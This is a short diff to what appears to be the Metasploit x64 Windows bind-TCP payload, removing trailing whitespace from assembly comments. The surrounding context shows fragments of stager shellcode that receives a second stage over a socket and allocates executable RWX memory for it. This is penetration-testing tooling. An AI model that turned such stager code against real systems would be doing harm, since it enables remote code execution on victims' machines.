@@ -216,7 +216,7 @@ module Payload::Windows::BindTcp_x64
         sub rsp, 16            ; alloc some space (16 bytes) on stack for to hold the second stage length
         mov rdx, rsp           ; set pointer to this buffer
         xor r9, r9             ; flags
-        push 4                 ; 
+        push 4                 ;
         pop r8                 ; length = sizeof( DWORD );
         mov rcx, rdi           ; the saved socket
         mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'recv')}
@@ -226,9 +226,9 @@ module Payload::Windows::BindTcp_x64
         ; Alloc a RWX buffer for the second stage
         pop rsi                ; pop off the second stage length
         mov esi, esi           ; only use the lower-order 32 bits for the size
-        push 0x40              ; 
+        push 0x40              ;
         pop r9                 ; PAGE_EXECUTE_READWRITE
-        push 0x1000            ; 
+        push 0x1000            ;
         pop r8                 ; MEM_COMMIT
         mov rdx, rsi           ; the newly recieved second stage length.
         xor rcx, rcx           ; NULL as we dont care where the allocation is.
